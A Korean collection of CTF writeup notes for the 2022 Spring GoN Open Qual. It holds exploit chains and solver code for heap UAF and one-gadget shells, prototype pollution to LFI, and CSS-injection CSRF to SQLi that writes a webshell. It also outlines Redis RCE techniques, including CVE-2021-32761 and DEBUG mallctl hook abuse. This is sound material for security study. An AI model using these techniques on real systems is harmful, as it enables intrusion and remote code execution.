# 2022 Spring GoN Open Qual - Writeup Collection

> Source 1 (참가자): https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/
> Source 2 (출제자): https://hackmd.io/@Xion/goq_22s_authors_writeup
> Platform: Dreamhack (다수 문제가 워게임으로 등록됨)

---

## A. CS448 — Crypto

**핵심 취약점**: `% 0xff` vs `& 0xFF`
- `(get_random_u8() + key * i) % 0xff` → 결과가 절대 255(0xff)가 될 수 없음
- `% 0xff`의 범위: 0~254 (255 제외)
- `& 0xFF`의 범위: 0~255

**공격법**:
1. 같은 플래그를 무한 횟수 암호화 요청
2. 각 바이트 위치에서 나타나는 XOR 결과값 추적
3. 절대 나타나지 않는 값 = enc 값이 255일 때의 결과
4. `missing_value ^ 255 = plaintext_byte`

**패턴 인식**: 모듈로 연산에서 범위 누락 → 통계적 공격

```python
# 핵심 로직
# enc = (random + key*i) % 0xff → never 255
# 충분히 많은 샘플에서 missing value 찾기
# plaintext[i] = missing_value ^ 0xff
```

---

## B. Oxidized — Pwn (Rust UAF)

**환경**: Rust 바이너리, glibc heap (tcache)
**취약점**: Use-After-Free + 힙 오버플로우 (크기 조작)

**익스플로잇 체인**:
1. tcache 0x60 크기 7개 채우고 free
2. 0x420 크기 할당 → unsorted bin → libc 주소 leak
3. UAF로 freed chunk의 fd 포인터를 `__free_hook`로 덮어쓰기
4. `__free_hook`을 `system` 주소로 변경
5. "/bin/sh" 문자열이 든 청크를 free → `system("/bin/sh")`

**주의사항**: UTF-8 검증이 있어서 `__free_hook` 주소에 0x80+ 바이트가 있으면 크래시. ASLR 재시도 필요.

**패턴**: Rust 바이너리여도 unsafe + heap = 전통적 glibc 익스플로잇 적용 가능

---

## C. RUN — Reversing (비트 압축 인코딩)

**기법**: Zero-run encoding (리틀엔디안)
- 연속 0의 개수를 카운트
- 카운트의 비트 수만큼 1 출력 + 카운트를 리틀엔디안 바이너리로 출력
- 1이면 "00" 출력

```python
# 디코더 핵심
while i < len(b):
    c = 0
    while b[i + c] == '1': c += 1  # 비트 수 카운트
    c += 1
    r = ''
    for j in range(c):
        r = b[i + c + j] + r  # 리틀엔디안으로 카운트 읽기
    g += '0' * int(r, 2) + '1'
    i += c * 2
```

---

## D. Nonsense — Reversing (GDB 브루트포스)

**상황**: 48바이트 입력을 2바이트씩 나눠 미지의 연산 → 참조 테이블과 비교
**접근**: 리버싱 대신 GDB 스크립트로 모든 2바이트 조합 브루트포스

**핵심 기법**: GDB Python API
```python
# 브레이크포인트에서:
# 1. $rdi에 테스트값 설정
# 2. 연산 실행
# 3. $rax 결과를 참조 테이블과 비교
# 4. 매치되면 해당 입력값 기록
# 5. $rip를 함수 시작으로 리셋하여 반복

class bpa(gdb.Breakpoint):
    def stop(self):
        gdb.execute(f"set $rdi={(a << 8) | b}")
        return False

class bpb(gdb.Breakpoint):
    def stop(self):
        x = int(gdb.execute("p $rax", to_string=True).split("=")[1].strip())
        if x in target_table:
            record_match(x, a, b)
        gdb.execute("set $rip=0x555555400B78")  # 함수 시작으로 리셋
        return False
```

**패턴**: 복잡한 연산 리버싱이 어려울 때 → GDB 스크립트로 I/O 매핑 브루트포스
- 입력 공간이 작을 때 유효 (2바이트 = 65536 * printable 범위)
- `set $rip`로 함수 반복 실행

---

## E. NullNull — Pwn (scanf null byte SFP 오버플로우)

**Dreamhack**: https://dreamhack.io/wargame/challenges/456

**취약점**: `scanf("%80s", &v1)` — 80바이트 + null terminator가 SFP(saved frame pointer) 하위 바이트를 0x00으로 덮음

**익스플로잇 체인**:
1. 80바이트 입력 → SFP LSB가 0x00으로 변경
2. rbp 변조 → 후속 함수의 rbp 기반 주소 참조가 엉뚱한 곳을 가리킴
3. 스택 인근 메모리에 대한 임의 읽기/쓰기 가능
4. libc leak → ROP 체인 구성 → system("/bin/sh")

**패턴 인식**: `scanf("%Ns")` + 버퍼 크기가 N과 같을 때 → null byte off-by-one → SFP 조작

---

## F. Unconventional — Reversing (커스텀 암호)

**구조**: ARIA sbox + AES shift-row + XOR/ADD/ROL + 0xC0FF33회 반복
- 16바이트 블록 단위 처리 (48바이트 = 3블록)

**연산 순서** (암호화):
1. `sub()`: ARIA의 2번째 sbox로 바이트 치환
2. `shift_row()`: AES 스타일 행 시프트
3. `enc()`: permutation 배열 기반 XOR → ADD → ROL
4. `xor()`: 키와 XOR
5. 키 자체도 sub → shift_row → enc로 업데이트

**복호화**: 각 단계의 역연산을 역순으로 적용
- Python이 느려서 C++로 포팅 (0xC0FF33 = 12,648,243 반복)

**패턴**: 커스텀 블록 암호 = 각 단계 역연산 구현 + 역순 적용. 반복 횟수가 크면 C/C++로 포팅.

---

## L. input box — Misc (OTF 폰트 분석)

**기법**: OTF 폰트의 GSUB(Glyph Substitution) 테이블에서 리가처 체인 역추적
1. TTX로 OTF → XML 변환
2. 특이한 너비의 글리프(G00979) 찾기 = 종료 마커
3. LigatureSet에서 역방향으로 추적: 어떤 글리프 + 어떤 문자 = 다음 글리프
4. 시작까지 역추적하면 플래그 문자 시퀀스 복원

---

## M. pyc — Reversing (Python 바이트코드)

**3단계 풀이**:

**1단계**: XOR 디코딩 — 암호화된 바이트코드를 키 배열과 XOR
```python
decrypted = bytes(i ^ j for i, j in zip(encrypted_bytecode, key_array))
```

**2단계**: 핸드 디컴파일 — dis 모듈 없이 opcode 수동 해석
```python
def chk(ipt):
    for i in range(len(ipt)-3):
        r0 = int.from_bytes(ipt[i:i+4], 'little')
        rotated = ((r0 >> ((i+16)%32)) | (r0 << ((-i+16)%32))) & 0xFFFFFFFF
        ipt = ipt[:i] + (rotated ^ 0xDEADBEEF).to_bytes(4, 'little') + ipt[i+4:]
    return ipt
```

**3단계**: 역연산 — 인덱스를 역순으로 XOR 먼저 한 뒤 역방향 rotate
```python
def dec(ipt):
    for i in list(range(len(ipt)-3))[::-1]:
        r0 = int.from_bytes(ipt[i:i+4], 'little') ^ 0xDEADBEEF
        rotated = ((r0 << ((i+16)%32)) | (r0 >> ((-i+16)%32))) & 0xFFFFFFFF
        ipt = ipt[:i] + rotated.to_bytes(4, 'little') + ipt[i+4:]
    return ipt
```

**패턴**: pyc 리버싱 = XOR 디코딩 → opcode 수동 해석 → 역연산

---

## N. Leetcode — Misc (타이밍 공격)

**구조**: 16바이트 입력을 4바이트 블록으로 나눠 SHA512 해시 비교
- 비교 순서가 랜덤이지만, 맞는 블록이 있으면 추가 해시 연산 → 응답 지연

**공격법**: 타이밍 사이드채널
1. 각 위치에 hex 문자 후보 전송
2. 응답 시간 측정
3. 유의미하게 느린 응답 = 해당 블록 일치

**한계**: 자동 임계값 설정이 어려움 → 수동 확인 병행

**패턴**: SHA512 블록 단위 비교 + `time.time()` 측정 → 타이밍 어택
- 블록 크기가 작을수록 (4바이트 hex = 2바이트) 브루트포스 가능

---

## O. Interchange — Crypto (AES-CTR 키 재사용)

**취약점**: AES-CTR 모드에서 동일 IV로 매번 새 cipher 생성 → keystream 재사용

**공격**:
```python
# 1. null 바이트 대량 암호화 → keystream 직접 획득
p.sendlineafter(b'>> ', b'1')
p.sendlineafter(b'>> ', b'\x00' * 0x1000)
keystream = bytes.fromhex(response)

# 2. flag 암호화 요청
p.sendlineafter(b'>> ', b'2')
encrypted_flag = bytes.fromhex(response)

# 3. XOR로 복호화
flag = xor(encrypted_flag, keystream)
```

**패턴**: CTR 모드 + 같은 IV = keystream 재사용 → null plaintext로 keystream leak → XOR 복호화

---

## Q. NSS — Web (Prototype Pollution + LFI)

**취약점 체인**:
1. **Prototype Pollution**: `__proto__`를 workspace 이름으로 사용 → `Object.prototype` 오염
2. **세션 바이패스**: polluted property로 토큰 검증 통과
3. **LFI**: `base_dir` property를 `/usr/src/app`으로 오염 → 임의 파일 읽기

**공격**:
```
POST /api/users/{userid}/__proto__
{
  "expire": "99999999999999999999999999",
  "owner": "__proto__",
  "base_dir": "/usr/src/app",
  "zzzzzz": "flag"
}

GET /api/users/__proto__/__proto__/zzzzzz
Token: __proto__
→ flag 파일 읽기
```

**패턴**: JS 백엔드 + 사용자 입력이 객체 키로 사용 → `__proto__` prototype pollution 시도

---

## R. billionaire — Blockchain

**방법**: 트랜잭션 상세 페이지에서 컨트랙트 스토리지 읽기 → Solidity 코드 로직대로 XOR → 플래그

---

## T/U. Legendary / Legendary Revenge — Crypto (Legendre PRF)

**기법**: Legendre PRF 크립토분석
- 기존 공개 solver 활용: https://github.com/cryptolu/LegendrePRF
- T: 표준 파라미터 → solve.cpp 직접 실행
- U: 큰 prime → 32GB RAM + 16스레드로 ~10분 실행

**패턴**: Legendre PRF 문제 → cryptolu/LegendrePRF 레포 참조

---

## V. ColorfulMemo — Web (LFI + CSRF + SQLi 체인)

**3중 취약점 체인**:

**1. LFI** (index.php):
```php
$path = "./" . $_GET["path"] . ".php";
include_once $path;  // path traversal 가능
```

**2. CSRF via CSS injection**:
```css
black;background-image:url("/?path=check.php&id={SQLi_PAYLOAD}")
```
메모 스타일 필드에 CSS 주입 → report하면 admin 브라우저가 악성 URL 로드

**3. SQL Injection** (check.php):
```php
// REMOTE_ADDR == 127.0.0.1일 때만 접근 가능 (CSRF로 우회)
$result = $mysqli->query('SELECT adminCheck FROM memo WHERE id = ' . $id);
// secure-file-priv=/tmp/
```

**공격 체인**:
1. SQLi payload가 포함된 CSS 스타일로 메모 생성
2. 메모 report → admin이 CSS 로드 → SQLi 실행
3. `INTO OUTFILE '/tmp/shell.php'`로 웹쉘 작성
4. LFI로 웹쉘 접근: `/?path=../../../tmp/shell`

**패턴**: report 기능 + CSS injection = CSRF → 내부 엔드포인트 접근 → SQLi → 파일 쓰기 → LFI

---
---

# 출제자 라이트업 보강 내용 (Author: Xion et al.)

> Source: https://hackmd.io/@Xion/goq_22s_authors_writeup

---

## A. CS448 — 출제자 보강

**출제자**: c0m0r1 / **솔버**: 45팀

더 정확한 분석: `get_random_u8()` 범위 [0, 255]에서 `% 0xff` 적용 시,
결과가 0이 될 확률이 2/256 (입력 0과 255 모두 결과 0). 즉 0에 대한 bias 존재.
→ 빈도 분석으로 각 위치의 plaintext 바이트 복원 가능.

---

## B. Oxidized — 출제자 보강

**출제자**: c0m0r1 / **솔버**: 13팀

**UAF 원인 (정확한 코드)**:
```rust
drop(unsafe { Box::from_raw(n as &mut Node as *mut Node) })
```
- `drop(Box::from_raw(...))`으로 메모리 해제하지만 벡터에서 노드를 제거하지 않음 → 댕글링 포인터
- `Box<Node>` = 0x18바이트, `Box<String>` = 0x18바이트 → 같은 tcache bin에서 관리

**익스플로잇 순서** (상세):
1. heap addr leak via UAF
2. heap spray with controlled strings
3. fake node 구조 생성
4. freed region에서 libc 포인터 leak
5. `__free_hook` → `system` 덮어쓰기
6. "/bin/sh" 청크 free → shell

---

## D. Nonsense — 출제자 보강 (ctypes 접근법)

**출제자**: c0m0r1 / **솔버**: 17팀

**핵심 인사이트**: 바이너리는 SIGSEGV 핸들러에서 플래그 검증 수행.
해시 함수는 **Quark** 해시. 리버싱 대신 ctypes로 직접 호출:

```python
from ctypes import *
import struct

binary = cdll.LoadLibrary('./main')
binary_base = cast(binary._handle, POINTER(c_longlong)).contents.value

do_hash_type = CFUNCTYPE(c_longlong, c_ushort)
func = do_hash_type(binary_base + 0xAB7)  # 해시 함수 오프셋

# 전수조사: 0x10000개 입력에 대해 해시 매핑
enc_dict = {}
for i in range(0x10000):
    enc_dict[func(i)] = i

# 참조 테이블에서 역 매핑
enc_arr = []
for i in range(24):
    enc_arr.append(cast(binary_base + 0x206020 + i * 8,
                       POINTER(c_longlong)).contents.value)

flag = ""
for enc in enc_arr:
    flag += struct.pack("<H", enc_dict[enc]).decode()
print("flag:", flag)
```

**GDB보다 나은 점**: ctypes는 프로세스 내에서 직접 함수 호출 → GDB 브레이크포인트 오버헤드 없이 훨씬 빠름.

---

## E. NullNull — 출제자 보강

**출제자**: Xion / **솔버**: 25팀

**정확한 메커니즘**:
- `scanf("%80s", buf)` → 80바이트 + null = 81바이트 → SFP 하위 바이트 0x00 덮어씀
- rbp 기반 배열 접근: `arrlen = [rbp - 0x18]`, `arrptr = [rbp - 0x20]`
- rbp 하위 바이트가 0x00이 되면 다른 스택 영역의 값이 arrlen/arrptr로 해석됨
- **one-gadget** 사용: `0xe3b31` 또는 `0xe3b34` (libc 2.31)

**솔버 코드 핵심**:
```python
echo('A' * 80)                          # SFP 하위 바이트 → 0x00
binary.address = readat(3) - 0x1249     # PIE base leak
rbp = readat(2) - 0x120                 # rbp leak
libc.address = readat(0x120 // 8 + 1) - libc.libc_start_main_return  # libc leak
writeat(3, libc.address + oneshots[0])  # return addr → one_gadget
p.sendline('4')                         # exit main → shell
```
ASLR 때문에 while True 루프로 재시도.

---

## F. Unconventional — 출제자 보강

**출제자**: Xion / **솔버**: 10팀

**핵심**: `xchg rsp, rax` — RSP와 RAX의 역할이 바뀐 커스텀 호출 규약.
- RAX가 스택 포인터, RSP가 반환값 레지스터
- push/pop 명령 없음
- 풀이법: RSP↔RAX 참조를 스왑한 후 재어셈블 → 디컴파일

**C 솔버** (전체): 출제자가 역연산을 포함한 완전한 C 코드 제공.
- `SubBytes_inv`, `RotateBlock_inv`, `Twiddle_inv`, `AddRoundKey_inv`
- 키 스케줄도 역방향으로 계산
- 0xC0FF33회 반복 → C로 ~수초 내 완료

---

## G. Trino: Albireo — Web (SSRF + TLS Session ID Poisoning)

**출제자**: Xion / **솔버**: 3팀

**환경**: pycurl + Flask + Memcached (pickle 기반 세션)

**취약점**: Curl의 TLS 세션 재사용 + DNS rebinding

**공격 체인**:
1. 도메인 설정: 첫 DNS → 공격자 IP, 두 번째 DNS → 내부 IP (Memcached)
2. 공격자 TLS 서버가 커스텀 Session ID (32바이트) 설정
3. HTTP redirect → 같은 도메인 (이제 내부 IP로 해석)
4. Curl이 TLS 세션 재사용 → ClientHello에 poisoned Session ID 포함
5. Session ID 바이트가 Memcached 명령으로 해석됨
6. Memcached에 pickle 세션 데이터 저장 → Flask에서 로드 시 코드 실행

**TLS 서버 구현**: RFC 5246 PRF + AES-128-GCM + 세션 지속성 관리 필요.

**기법 상세**: `techniques/ssrf_tls_session_poisoning.md` 참조

---

## H. Trino: Pieces — Misc/Pwn/Web (Pickle 역직렬화 우회)

**출제자**: Xion / **솔버**: 2팀

**제한**: Custom Unpickler가 `picklable` 모듈만 허용
```python
class Unpickler(pickle.Unpickler):
    def find_class(self, module, name):
        assert module == 'picklable'
        return getattr(__import__('picklable'), name)
```

**우회 체인**:
1. `picklable.picklable` → `picklable.__dict__`로 덮어쓰기
2. `__import__` → `__getattribute__`로 교체
3. `__builtins__` 로드 → `eval` 획득
4. 모듈 체인: `picklable.requester.whatwg_url.six.sys.modules["os"]`
5. `eval(cmd)` → RCE

**참고**: Balsn CTF 2019 pyshv2 기법 기반. 상세: `techniques/pickle_deserialization.md`

---

## I. Trino: Rendezvous — Pwn (Redis CVE-2021-32761)

**출제자**: Xion / **솔버**: 0팀

**환경**: Redis 6.2.4 **32-bit** 빌드

**취약점**: `BITFIELD` 명령의 32비트 정수 오버플로우
```c
// bitoffset + bits - 1 이 32비트에서 wrap around
highest_write_offset = bitoffset + bits - 1;  // 오버플로우!
```
→ bitfield 기본 포인터에서 ~512MB OOB 읽기/쓰기

**익스플로잇 체인**:
1. `SET` 명령으로 heap spray
2. `BITFIELD` 오프셋 조작 → OOB read/write
3. Redis 객체 type confusion (integer → raw string)
4. libc 주소 leak → ld.so → link_map → redis-server base
5. GOT overwrite (`fcntl64`, `strtold`, `vsnprintf`)
6. ROP → mprotect → shellcode → RCE

**상세**: `techniques/redis_exploitation.md` 참조

---

## J. Trino: Mirai — Pwn (Redis Latest RCE via jemalloc)

**출제자**: Xion / **솔버**: 0팀

**환경**: Redis 6.2.6 (당시 최신 stable), 기본 설정

**취약점**: `DEBUG mallctl` 명령으로 jemalloc extent_hooks 직접 조작
```redis
DEBUG mallctl arena.0.extent_hooks <attacker_address>
```
- extent_hooks = jemalloc의 메모리 할당 콜백 (glibc `__malloc_hook`과 유사)
- 훅 주소 변경 → 메모리 할당 시 RIP 제어

**익스플로잇**:
1. `DEBUG mallctl`로 extent_hooks 덮어쓰기
2. `DEBUG OBJECT`로 페이로드 주소 leak
3. ROP 가젯으로 페이로드 가리키기
4. `SET`/`LPUSH` 등으로 할당 트리거 → 코드 실행

**의미**: Redis 최신 버전 기본 설정에서의 RCE. 공개된 exploit 없음 (2022 기준).

**상세**: `techniques/redis_exploitation.md` 참조
